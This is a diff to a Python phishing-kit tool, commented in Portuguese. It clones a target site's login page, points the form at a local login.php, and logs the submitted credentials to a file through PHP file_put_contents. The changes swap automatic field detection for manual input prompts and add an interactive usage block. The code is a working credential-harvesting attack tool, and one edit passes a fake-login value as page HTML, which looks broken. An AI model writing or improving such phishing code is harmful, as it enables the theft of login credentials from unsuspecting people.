@@ -6,6 +6,8 @@ from bs4 import BeautifulSoup as bs
 class Create:
     def __init__(self):
         self.browser = None
+        self.username_field = None
+        self.password_field = None
         self.username = None
         self.password = None
         self.loginphp = 'login.php'  # escreva as informações de postagem
@@ -35,32 +37,22 @@ file_put_contents($file, $data, FILE_APPEND);\n?>\n
     def useragent(self):
         return 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko'
 
-    def extract(self, line, username=True):
-        name = line[13:-3] if username else line[17:-3]
-        return name
-
-    def getFields(self):
-        for form in self.browser.forms():
-            for line in str(form).split():
-                if '<TextControl(' in line:
-                    self.username = self.extract(line)
-                if '<PasswordControl(' in line:
-                    self.password = self.extract(line, False)
-                    return
+    def manualInput(self):
+        self.username_field = input("Digite o nome do campo de usuário: ")
+        self.password_field = input("Digite o nome do campo de senha: ")
+        self.username = input("Digite o nome de usuário: ")
+        self.password = input("Digite a senha: ")
 
     def replace(self, html):
-        # método 1
-        src = bs(html, 'lxml')
-        action = src.find('form').get('action')
-        if action.strip():
-            newSrc = re.sub(action, self.loginphp, html)
-            _src = bs(newSrc, 'lxml')
-            if _src.find('form').get('action') != action:
-                return newSrc
-
-        # método 2
         html = bs(html, 'html.parser')
-        html.find('form').attrs['action'] = self.loginphp
+        form = html.find('form')
+        form.attrs['action'] = self.loginphp
+
+        if not self.username_field:
+            self.username_field = input("Digite o nome do campo de usuário: ")
+        if not self.password_field:
+            self.password_field = input("Digite o nome do campo de senha: ")
+
         return str(html)
 
     def createHtml(self, src, index=True):
@@ -75,16 +67,12 @@ file_put_contents($file, $data, FILE_APPEND);\n?>\n
 
         try:
             html = self.browser.open(page)
-            self.getFields()
+            self.manualInput()
 
-            if any([not self.username, not self.password]):
-                self.exit(page)
             self.createHtml(html.read())  # index.html
 
             # error.html
-            self.browser.select_form(nr=0)
-            self.browser[self.username] = self.fakeLogin
-            self.createHtml(self.browser.submit().read(), False)
+            self.createHtml(self.fakeLogin, False)
 
             print('[ Fields Found ]\nUsername: {}\nPassword: {}'.format(self.username, self.password))
 
@@ -100,3 +88,9 @@ file_put_contents($file, $data, FILE_APPEND);\n?>\n
     def php(self):
         with open(self.loginphp, 'w') as phpfile:
             phpfile.write(self.phpsrc.format(self.username, self.password))
+
+# Exemplo de uso
+if __name__ == "__main__":
+    create_instance = Create()
+    url = input("Digite a URL: ")
+    create_instance.html(url)
